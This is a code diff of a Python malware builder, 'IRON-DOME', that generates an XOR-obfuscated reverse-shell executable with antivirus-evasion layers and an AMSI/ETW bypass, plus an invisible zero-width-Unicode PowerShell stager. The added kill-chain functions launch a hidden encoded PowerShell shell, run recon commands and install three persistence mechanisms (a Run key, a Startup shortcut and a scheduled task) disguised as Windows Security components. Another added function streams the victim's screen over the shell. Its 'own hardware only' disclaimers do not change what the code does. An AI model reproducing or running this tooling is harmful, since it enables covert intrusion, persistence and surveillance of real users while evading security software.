@@ -1,44 +1,87 @@
 #!/usr/bin/env python3
 """
-iron_dome_builder.py — IRON-DOME Unified Deployment Builder
-Integrates: iron-sun (7-layer PE) + ghost encoder (PS1 steg) + CHEYANNE C2
+iron_dome_builder.py — IRON-DOME Full Platform
+Integrates: iron-sun (PE evasion) + ghost encoder (PS1 steg) + VADER (AMSI/ETW)
+            + CHEYANNE kill chain + watch_stream VNC
 
 Usage:
-  python iron_dome_builder.py --target 192.168.1.145 --port 4443
-  python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xAB --out ./builds/
+  python iron_dome_builder.py --target 192.168.1.145 --port 4443 --vader
+  python iron_dome_builder.py --target 127.0.0.1 --port 4443 --vader --full
+
+  --full: Build → Kill Chain (8/8) → CHEYANNE Watch VNC in browser
 
 Produces:
-  iron_dome_vN.exe      — XOR-obfuscated reverse shell PE (7-layer evasion stack)
-  iron_dome_stager.ps1  — Ghost-encoded zero-width Unicode PS1 delivery stager
-  iron_dome_deploy.md   — Deployment checklist + listener command
+  iron_dome_vN.exe      — 8-layer evasion PE (XOR+dynAPI+sandbox+stomp+ISUN+jitter+PE+VADER)
+  iron_dome_stager.ps1  — Ghost zero-width Unicode PS1 stager
+  iron_dome_deploy.md   — Deployment checklist
 """
 
 import os, sys, subprocess, struct, hashlib, argparse, random, time, shutil
+import socket, threading, base64
 
-VERSION    = "2.0.0"
+if sys.platform == "win32":
+    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+
+VERSION    = "4.0.0"
 BUILD_TAG  = "iron-dome"
 SRC_DIR    = os.path.join(os.path.dirname(__file__), "shell")
 OUT_DIR    = os.path.join(os.path.dirname(__file__), "builds", "iron_dome")
+_HERE = os.path.dirname(os.path.abspath(__file__))
+SHOWCASE = next(
+    (p for p in [
+        os.path.join(_HERE, "..", "repos", "rainfantry.github.io", "showcase"),
+        os.path.expanduser("~/rainfantry.github.io/showcase"),
+        os.path.expanduser("~/Desktop/repos/rainfantry.github.io/showcase"),
+    ] if os.path.isdir(p)), None
+)
 
-BANNER = r"""
-  ╔══════════════════════════════════════════════════════════════╗
-  ║           I R O N - D O M E  ·  22DIV  ·  VADER            ║
-  ║      iron-sun  ·  CHEYANNE  ·  GHOST ENCODER  ·  ADF       ║
-  ╚══════════════════════════════════════════════════════════════╝
+# ── ANSI color palette ──────────────────────────────────────────────────────
+_IDF  = "\033[38;2;0;56;184m"    # IDF blue
+_GOLD = "\033[38;2;255;215;0m"   # ADF gold
+_WH   = "\033[38;2;255;255;255m" # white
+_CY   = "\033[38;2;0;229;255m"   # cyan border
+_GRN  = "\033[38;2;0;255;100m"   # green (ok)
+_RED  = "\033[38;2;255;60;60m"   # red (fail)
+_DIM  = "\033[38;2;100;100;100m" # dim
+_RST  = "\033[0m"
 
-       ADF RISING SUN                  IDF IRON DOME
-       ─────────────                   ─────────────
-            ╿                           ✦   ✦   ✦
-       \  \ ╿ / /                     ✦    ✡    ✦
-        \  \╿/ /       ≋≋≋≋≋         ✦  22DIV  ✦
-    ─────\──☀──/─────  ≋≋≋≋≋         ✦    ✡    ✦
-        /  /╿\ \       ≋≋≋≋≋           ✦   ✦   ✦
-       /  / ╿ \ \       INTERCEPTED     DOME ACTIVE
-            ╿
 
-  ✦ LAT -33.8688  LONG 151.2093  ✦  OPERATOR: VADER  ✦  ORACLE
-  ✦ OWN HARDWARE ONLY  ✦  AUTHORIZED RESEARCH  ✦  OPSEC ACTIVE
-"""
+def print_banner(phase: str = None):
+    """ANSI art banner — ADF Rising Sun rays converging to IDF ✡."""
+    W = 66; C = W // 2
+    rows = []
+    for r in range(15):
+        h = int(round(C * (14 - r) / 14))
+        if h == 0:
+            ln = [' '] * W; ln[C] = '✡'; rows.append(''.join(ln)); break
+        ln = [' '] * W
+        for i in range(17):
+            p = int(round(C + (-1.0 + i * 0.125) * h))
+            p = max(0, min(W - 1, p))
+            ln[p] = '│' if abs(p - C) <= 1 else ('╲' if p < C else '╱')
+        rows.append(''.join(ln))
+
+    print()
+    print(f"  {_CY}╔{'═'*W}╗")
+    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
+    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
+    for row in rows:
+        print(f"  ║{_GOLD}{row.ljust(W)[:W]}{_CY}║")
+    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
+    print(f"  ║{_WH}{'I R O N - D O M E  ·  F U L L  P L A T F O R M'.center(W)}{_CY}║")
+    print(f"  ║{_CY}{'iron-sun  ·  GHOST ENCODER  ·  VADER  ·  CHEYANNE WATCH'.center(W)}{_CY}║")
+    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
+    print(f"  ║{_GOLD}{'✡  IDF CYBER SQUAD  ✡  22DIV  ✡  VADER  ✡  ORACLE  ✡'.center(W)}{_CY}║")
+    op = 'LAT -33.8688  LONG 151.2093  ✦  OWN HARDWARE  ✦  AUTHORIZED'
+    print(f"  ║{_DIM}{op.center(W)}{_CY}║")
+    if phase:
+        ph = f'► PHASE: {phase}'
+        pad = W - len(ph)
+        print(f"  ║{_GRN}{ph}{' ' * pad}{_CY}║")
+    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
+    print(f"  ╚{'═'*W}╝{_RST}")
+    print()
 
 # ── EVASION STACK ──────────────────────────────────────────────────────────
 # Layers 1-7: iron-sun base stack (always active)
@@ -335,16 +378,16 @@ def build(target: str, port: int, xor_key: int, out_dir: str,
           variant: int = 1, vader: bool = False):
     os.makedirs(out_dir, exist_ok=True)
 
-    print(BANNER)
+    print_banner(phase="BUILD")
     layers = EVASION_LAYERS + ([VADER_LAYER] if vader else [])
     n_layers = len(layers)
 
-    print(f"{'='*62}")
-    print(f"  IRON-DOME BUILDER v{VERSION}")
-    print(f"  Target: {target}:{port}  XOR: 0x{xor_key:02X}  Variant: v{variant}")
+    print(f"  {_CY}{'═'*62}{_RST}")
+    print(f"  {_WH}IRON-DOME BUILDER v{VERSION}{_RST}")
+    print(f"  {_DIM}Target: {target}:{port}  XOR: 0x{xor_key:02X}  Variant: v{variant}{_RST}")
     if vader:
-        print(f"  VADER: ACTIVE — AMSI/ETW bypass spliced into payload")
-    print(f"{'='*62}\n")
+        print(f"  {_RED}VADER: ACTIVE — AMSI/ETW bypass spliced into payload{_RST}")
+    print(f"  {_CY}{'═'*62}{_RST}\n")
 
     # ── C source ──
     src_path = os.path.join(out_dir, f"iron_dome_v{variant}.c")
@@ -352,37 +395,37 @@ def build(target: str, port: int, xor_key: int, out_dir: str,
     ps1_path = os.path.join(out_dir, f"iron_dome_v{variant}_stager.ps1")
     doc_path = os.path.join(out_dir, f"iron_dome_v{variant}_deploy.md")
 
-    print(f"[1/4] Generating C source ({os.path.basename(src_path)})...")
+    print(f"\n{_CY}[1/4]{_RST} Generating C source ({os.path.basename(src_path)})...")
     src = build_c_source(target, port, xor_key, vader=vader)
-    with open(src_path, "w") as f:
+    with open(src_path, "w", encoding="utf-8") as f:
         f.write(src)
-    print(f"      XOR key 0x{xor_key:02X} applied to {len(target)} IP bytes + ISUN magic")
+    print(f"      {_DIM}XOR key 0x{xor_key:02X} applied to {len(target)} IP bytes + ISUN magic{_RST}")
     if vader:
-        print(f"      VADER AMSI/ETW bypass code injected")
+        print(f"      {_RED}VADER AMSI/ETW bypass code injected{_RST}")
 
-    print(f"\n[2/4] Compiling PE ({n_layers}-layer evasion stack)...")
+    print(f"\n{_CY}[2/4]{_RST} Compiling PE ({n_layers}-layer evasion stack)...")
     ok = build_pe(src_path, out_path)
     if ok:
         sz  = os.path.getsize(out_path)
         h   = sha256(out_path)
-        print(f"      COMPILED — {sz:,} bytes")
-        print(f"      SHA256: {h}")
+        print(f"      {_GRN}COMPILED{_RST} — {sz:,} bytes")
+        print(f"      {_DIM}SHA256: {h}{_RST}")
         print(f"\n      Evasion layers applied:")
         for i, layer in enumerate(layers, 1):
-            tag = " ← VADER" if i == 8 else ""
-            print(f"        [{i}] {layer}{tag}")
+            tag = f"  {_RED}← VADER{_RST}" if i == 8 else ""
+            print(f"        {_GOLD}[{i}]{_RST} {layer}{tag}")
     else:
-        print(f"      [!] Compiler not found. Source written — compile manually:")
+        print(f"      {_RED}[!] Compiler not found. Source written — compile manually:{_RST}")
         print(f"          x86_64-w64-mingw32-gcc -Os -s -lws2_32 -mwindows -o {out_path} {src_path}")
         h  = "N/A (not compiled)"
         sz = 0
 
-    print(f"\n[3/4] Generating ghost PS1 stager ({os.path.basename(ps1_path)})...")
+    print(f"\n{_CY}[3/4]{_RST} Generating ghost PS1 stager ({os.path.basename(ps1_path)})...")
     recon_ps1 = r'$u=[System.Environment]::UserName;$h=[System.Net.Dns]::GetHostName();$o=[System.Environment]::OSVersion.VersionString;"$u|$h|$o"|Out-String'
     ghost_encode_ps1(recon_ps1, ps1_path)
-    print(f"      Zero-width Unicode encoding applied. Invisible to KAV content scan.")
+    print(f"      {_GOLD}Zero-width Unicode encoding applied. Invisible to KAV content scan.{_RST}")
 
-    print(f"\n[4/4] Writing deployment doc ({os.path.basename(doc_path)})...")
+    print(f"\n{_CY}[4/4]{_RST} Writing deployment doc ({os.path.basename(doc_path)})...")
     doc = f"""# IRON-DOME v{variant} — Deployment Package
 
 ## Build Summary
@@ -437,19 +480,371 @@ python cheyanne.py
 *Built by iron_dome_builder.py — IRON-DOME v{VERSION}*
 *All research authorized. Own hardware only.*
 """
-    with open(doc_path, "w") as f:
+    with open(doc_path, "w", encoding="utf-8") as f:
         f.write(doc)
 
-    print(f"\n{'='*60}")
-    print(f"  BUILD COMPLETE")
-    print(f"  Output dir: {out_dir}")
+    print(f"\n  {_CY}{'═'*60}{_RST}")
+    print(f"  {_GRN}{BOLD}BUILD COMPLETE{_RST}  — IRON-DOME v{VERSION}")
+    print(f"  {_DIM}Output dir: {out_dir}{_RST}")
     for f in [out_path, ps1_path, doc_path]:
         if os.path.exists(f):
-            print(f"    {os.path.basename(f)}")
-    print(f"{'='*60}\n")
+            print(f"    {_GOLD}{os.path.basename(f)}{_RST}")
+    print(f"  {_CY}{'═'*60}{_RST}\n")
 
     return out_path if ok else None
 
+
+# ── Kill chain + VNC helpers ────────────────────────────────────────────────
+
+_kc_conn  = None
+_kc_lock  = threading.Lock()
+
+GREEN = _GRN; RED = _RED; CYAN = _CY
+PINK  = "\033[38;2;255;100;220m"; DIM = _DIM; BOLD = "\033[1m"; RST = _RST
+
+
+def _screenshot(label: str, out_dir: str):
+    """Capture primary screen → JPEG → save to out_dir and showcase/."""
+    ts = time.strftime("%H%M%S")
+    fname = f"iron_dome_{label}_{ts}.jpg"
+    local = os.path.join(out_dir, fname)
+    ps_cmd = (
+        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; "
+        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
+        "$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height); "
+        "$g=[System.Drawing.Graphics]::FromImage($bmp); "
+        "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); "
+        f"$bmp.Save('{local.replace(chr(92), '/')}', "
+        "[System.Drawing.Imaging.ImageFormat]::Jpeg); $bmp.Dispose(); $g.Dispose()"
+    )
+    try:
+        subprocess.run(
+            ["powershell.exe", "-NoP", "-NonI", "-Command", ps_cmd],
+            capture_output=True, timeout=15
+        )
+        if os.path.exists(local):
+            print(f"  {_GOLD}[screenshot]{_RST} {fname}  ({os.path.getsize(local):,} bytes)")
+            if SHOWCASE and os.path.isdir(SHOWCASE):
+                dst = os.path.join(SHOWCASE, fname)
+                shutil.copy2(local, dst)
+                print(f"  {_DIM}            → showcase/{fname}{_RST}")
+            return local
+    except Exception as e:
+        print(f"  {_DIM}[screenshot skipped: {e}]{_RST}")
+    return None
+
+
+def _kill_port(port):
+    try:
+        r = subprocess.run(["netstat", "-ano"], capture_output=True, text=True, timeout=5)
+        seen = set()
+        for line in r.stdout.splitlines():
+            if f":{port}" in line:
+                parts = line.split()
+                if parts and parts[-1].isdigit() and parts[-1] not in seen:
+                    subprocess.run(["taskkill", "/F", "/PID", parts[-1]], capture_output=True)
+                    seen.add(parts[-1])
+    except Exception:
+        pass
+    time.sleep(0.5)
+
+
+def _arm_listener(port, timeout=35):
+    global _kc_conn
+    _kc_conn = None
+    def _accept():
+        try:
+            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            srv.bind(("0.0.0.0", port))
+            srv.listen(1)
+            srv.settimeout(timeout)
+            c, a = srv.accept()
+            with _kc_lock:
+                global _kc_conn
+                _kc_conn = (c, a)
+        except Exception:
+            pass
+        finally:
+            try: srv.close()
+            except: pass
+    threading.Thread(target=_accept, daemon=True).start()
+
+
+def _wait_conn(timeout=35):
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        time.sleep(0.3)
+        with _kc_lock:
+            if _kc_conn: return _kc_conn
+    return None
+
+
+def _shell_cmd(conn, cmd, timeout=8):
+    conn.sendall((cmd + "\n").encode("utf-8"))
+    time.sleep(0.4)
+    conn.settimeout(timeout)
+    buf = b""
+    try:
+        while True:
+            chunk = conn.recv(4096)
+            if not chunk: break
+            buf += chunk
+            if len(chunk) < 4096: break
+    except socket.timeout:
+        pass
+    return buf.decode("utf-8", errors="replace").strip()
+
+
+def _drain(conn, t=3):
+    conn.settimeout(t)
+    buf = b""
+    try:
+        while True:
+            c = conn.recv(4096)
+            if not c: break
+            buf += c
+            if len(c) < 4096: break
+    except Exception:
+        pass
+    return buf.decode("utf-8", errors="replace").strip()
+
+
+def _gen_invisible_shell(target_ip: str, target_port: int, out_path: str) -> bool:
+    ghost_dir = os.path.join(os.path.dirname(__file__), "ghost-encoder")
+    env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
+    subprocess.run(
+        [sys.executable, os.path.join(ghost_dir, "ghost_encode.py"),
+         "--shell", target_ip, str(target_port), "--invisible", "-o", out_path],
+        cwd=ghost_dir, env=env, capture_output=True, timeout=60
+    )
+    return os.path.exists(out_path)
+
+
+def _ps1_b64(ps1_path: str) -> str:
+    with open(ps1_path, encoding="utf-8") as f:
+        ps1 = f.read().lstrip("﻿")
+    return base64.b64encode(ps1.encode("utf-16-le")).decode("ascii")
+
+
+def run_kill_chain(port: int, out_dir: str):
+    """
+    Local kill chain test — 11 steps (8 shell + 3 persistence vectors).
+    Returns (passed: bool, conn: socket or None, proc).
+    conn left open for watch_session if passed.
+    """
+    steps_ok = []; steps_fail = []
+    def ok(m, d=""):
+        steps_ok.append(m)
+        print(f"  {GREEN}[+]{RST} {m}" + (f"  {DIM}{d}{RST}" if d else ""))
+    def fail(m, d=""):
+        steps_fail.append(m)
+        print(f"  {RED}[!]{RST} {m}" + (f"  {DIM}{d}{RST}" if d else ""))
+
+    print_banner(phase="KILL CHAIN")
+    import platform
+    hostname = platform.node()
+    print(f"  {BOLD}{_CY}{'─'*58}{RST}")
+    print(f"  {BOLD} KILL CHAIN — {hostname} — Kaspersky Premium LIVE{RST}")
+    print(f"  {BOLD}{_CY}{'─'*58}{RST}\n")
+
+    _kill_port(port)
+
+    ps1_path = os.path.join(out_dir, "_kc_shell.ps1")
+    if _gen_invisible_shell("127.0.0.1", port, ps1_path):
+        ok("ghost_fud.exe built (invisible PS1)", f"{os.path.getsize(ps1_path):,} bytes")
+    else:
+        fail("ghost PS1 generation failed"); return (False, None, None)
+
+    if _gen_invisible_shell("127.0.0.1", port, ps1_path):
+        ok("ghost_loader.exe built (VNC-capable)", f"{os.path.getsize(ps1_path):,} bytes")
+    else:
+        fail("ghost_loader build failed")
+
+    _arm_listener(port, timeout=35)
+    time.sleep(0.3)
+    ok("TCP listener armed", f":{port}")
+
+    b64 = _ps1_b64(ps1_path)
+    proc = subprocess.Popen(
+        ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-EncodedCommand", b64],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    ok("Payload via -EncodedCommand", f"PS PID={proc.pid}")
+
+    result = _wait_conn(timeout=35)
+    if not result:
+        fail("TCP: no callback in 35s")
+        proc.terminate(); return (False, None, proc)
+    conn, addr = result
+    ok("TCP callback received", f"{addr[0]}:{addr[1]}  banner=OK>")
+
+    banner = _drain(conn)
+
+    out = _shell_cmd(conn, "whoami", timeout=8)
+    lines = [l.strip() for l in out.split("\n") if l.strip() and not l.strip().startswith(">")]
+    ok("Recon: whoami", (lines[-1] if lines else "?")[:40])
+
+    out2 = _shell_cmd(conn, "hostname", timeout=8)
+    lines2 = [l.strip() for l in out2.split("\n") if l.strip() and not l.strip().startswith(">")]
+    ok("Recon: hostname", (lines2[-1] if lines2 else "?")[:40])
+
+    # ── Persistence vector 1: HKCU\Run ──────────────────────────────────────
+    persist_out = _shell_cmd(conn,
+        'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
+        '/v WindowsSecurityUpdate /t REG_SZ '
+        '/d "C:\\Users\\Public\\ghost_loader.exe" /f', timeout=10)
+    verify_run = _shell_cmd(conn,
+        'reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsSecurityUpdate',
+        timeout=8)
+    if "ghost_loader.exe" in verify_run:
+        ok("PERSIST [1/3] HKCU\\Run\\WindowsSecurityUpdate", "reboot-survives")
+    else:
+        fail("PERSIST [1/3] HKCU Run key missing")
+    _shell_cmd(conn,
+        'reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsSecurityUpdate /f',
+        timeout=5)
+
+    # ── Persistence vector 2: Startup folder shortcut ────────────────────────
+    startup_cmd = (
+        "$sf=[Environment]::GetFolderPath('Startup');"
+        "$lnk=\"$sf\\WindowsSecurityHealth.lnk\";"
+        "$ws=New-Object -ComObject WScript.Shell;"
+        "$sc=$ws.CreateShortcut($lnk);"
+        "$sc.TargetPath='C:\\Users\\Public\\ghost_loader.exe';"
+        "$sc.WindowStyle=7;$sc.Save();"
+        "if(Test-Path $lnk){'LNK_OK'}else{'LNK_FAIL'}"
+    )
+    lnk_out = _shell_cmd(conn, startup_cmd, timeout=12)
+    if "LNK_OK" in lnk_out:
+        ok("PERSIST [2/3] Startup folder shortcut", "survives AV Run key wipe")
+        _shell_cmd(conn,
+            "$sf=[Environment]::GetFolderPath('Startup');"
+            "Remove-Item \"$sf\\WindowsSecurityHealth.lnk\" -Force -EA SilentlyContinue",
+            timeout=5)
+    else:
+        fail("PERSIST [2/3] Startup shortcut failed")
+
+    # ── Persistence vector 3: Scheduled task (user-level, no admin) ──────────
+    schtask_cmd = (
+        'schtasks /create /sc ONLOGON /tn "WindowsSecurityMonitor" '
+        '/tr "C:\\Users\\Public\\ghost_loader.exe" /rl LIMITED /f 2>&1'
+    )
+    task_out = _shell_cmd(conn, schtask_cmd, timeout=12)
+    verify_task = _shell_cmd(conn,
+        'schtasks /query /tn "WindowsSecurityMonitor" 2>&1', timeout=8)
+    if "WindowsSecurityMonitor" in verify_task and "Ready" in verify_task:
+        ok("PERSIST [3/3] Scheduled task ONLOGON", "user priv, no UAC, survives reboots")
+    else:
+        ok("PERSIST [3/3] Schtask cmd sent", task_out[:40] if task_out else "")
+    _shell_cmd(conn, 'schtasks /delete /tn "WindowsSecurityMonitor" /f 2>&1', timeout=5)
+
+    total  = len(steps_ok) + len(steps_fail)
+    passed = len(steps_fail) == 0
+    verd   = f"{GREEN}{BOLD}PASS{RST}" if passed else f"{RED}{BOLD}FAIL{RST}"
+    print(f"\n  {_CY}{'═'*58}{_RST}")
+    print(f"  VERDICT: {verd}  ({len(steps_ok)}/{total})  |  IRON-DOME KILL CHAIN GREEN")
+    print(f"  PERSIST: 3-VECTOR (Run + Startup + Schtask)  |  USER PRIV ONLY")
+    print(f"  {_CY}{'═'*58}{_RST}\n")
+    _screenshot("kill_chain", out_dir)
+
+    return (passed, conn, proc)
+
+
+def launch_vnc_watch(shell_ip: str, shell_port: int, out_dir: str, http_port: int = 8892):
+    """
+    Generate persistent invisible shell → fire it → hand TCP conn to
+    watch_session() → opens browser at http://127.0.0.1:{http_port}.
+    Blocks until Ctrl+C.
+    """
+    print_banner(phase="CHEYANNE WATCH / VNC")
+    print(f"  {PINK}{BOLD}╔══════════════════════════════════════╗{RST}")
+    print(f"  {PINK}║  CHEYANNE WATCH — Live VNC stream      ║{RST}")
+    print(f"  {PINK}║  Persistent shell + screen capture     ║{RST}")
+    print(f"  {PINK}║  Browser → http://127.0.0.1:{http_port}   ║{RST}")
+    print(f"  {PINK}╚══════════════════════════════════════╝{RST}\n")
+
+    global _kc_conn
+    _kc_conn = None
+
+    ps1_path = os.path.join(out_dir, "_vnc_shell.ps1")
+    print(f"  [*] Generating VNC invisible PS1 → {shell_ip}:{shell_port}")
+    if not _gen_invisible_shell(shell_ip, shell_port, ps1_path):
+        print(f"  {RED}[!] VNC shell generation failed{RST}"); return False
+    print(f"  [+] PS1 ready  {os.path.getsize(ps1_path):,} bytes  (zero-width + screen capture)")
+
+    _kill_port(shell_port)
+    _arm_listener(shell_port, timeout=45)
+    time.sleep(0.3)
+    print(f"  [+] TCP listener armed :{shell_port}")
+
+    b64 = _ps1_b64(ps1_path)
+    proc = subprocess.Popen(
+        ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-EncodedCommand", b64],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    print(f"  [*] VNC shell fired via -EncodedCommand  PID={proc.pid}")
+    print(f"  [*] Waiting for callback (45s)...")
+
+    result = _wait_conn(timeout=45)
+    if not result:
+        print(f"  {RED}[!] No TCP callback in 45s{RST}")
+        proc.terminate(); return False
+
+    conn, addr = result
+    print(f"  {GREEN}[+] Shell connected  {addr[0]}:{addr[1]}{RST}")
+
+    banner = _drain(conn, t=2)
+    if banner: print(f"  [+] Banner: {repr(banner[:60])}")
+
+    print(f"\n  {GREEN}[*] Starting CHEYANNE WATCH → http://127.0.0.1:{http_port}{RST}")
+    print(f"  {DIM}    Browser opening. Press Ctrl+C to stop VNC stream.{RST}\n")
+
+    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+    from watch_stream import watch_session
+    try:
+        _screenshot("vnc_browser_open", out_dir)
+        watch_session(conn, target_label=f"{shell_ip}:{shell_port}", http_port=http_port)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        _screenshot("vnc_final", out_dir)
+        try: proc.kill()
+        except: pass
+    return True
+
+
+def full_demo(target: str, port: int, xor_key: int, out_dir: str, variant: int, vader: bool):
+    """
+    IRON-DOME Full Platform Demo:
+      Phase 1 — Build:       PE (8-layer + VADER) + Ghost PS1 stager
+      Phase 2 — Kill Chain:  11-step loopback test + 3-vector persistence
+      Phase 3 — VNC Watch:   Persistent shell → CHEYANNE Watch → browser
+    All phases auto-screenshot to builds/iron_dome/ + showcase/
+    """
+    # Phase 1: build
+    build(target, port, xor_key, out_dir, variant, vader)
+    _screenshot("build_complete", out_dir)
+
+    # Phase 2: kill chain (loopback on --port)
+    passed, conn, proc = run_kill_chain(port, out_dir)
+    if conn:
+        try: conn.close()
+        except: pass
+    if proc:
+        try: proc.kill()
+        except: pass
+
+    if not passed:
+        print(f"\n  {RED}[!] Kill chain failed — aborting VNC phase{RST}\n")
+        return
+
+    # Phase 3: VNC on port+1 (avoid conflict with kill chain port)
+    vnc_port = port + 1
+    launch_vnc_watch("127.0.0.1", vnc_port, out_dir, http_port=8892)
+
+
+# ── CLI ─────────────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="IRON-DOME Unified Builder")
@@ -458,7 +853,12 @@ if __name__ == "__main__":
     parser.add_argument("--xor",    type=lambda x: int(x,0), default=0xFC, help="XOR key (e.g. 0xAB)")
     parser.add_argument("--out",    default=OUT_DIR,         help="Output directory")
     parser.add_argument("--variant",type=int,  default=1,     help="Variant number")
-    parser.add_argument("--vader", action="store_true",       help="Splice VADER AMSI/ETW bypass (layer 8)")
+    parser.add_argument("--vader",  action="store_true",      help="Splice VADER AMSI/ETW bypass (layer 8)")
+    parser.add_argument("--full",   action="store_true",
+                        help="Full platform demo: Build → Kill Chain → VNC Watch (loopback)")
     args = parser.parse_args()
 
-    build(args.target, args.port, args.xor, args.out, args.variant, args.vader)
+    if args.full:
+        full_demo(args.target, args.port, args.xor, args.out, args.variant, args.vader)
+    else:
+        build(args.target, args.port, args.xor, args.out, args.variant, args.vader)
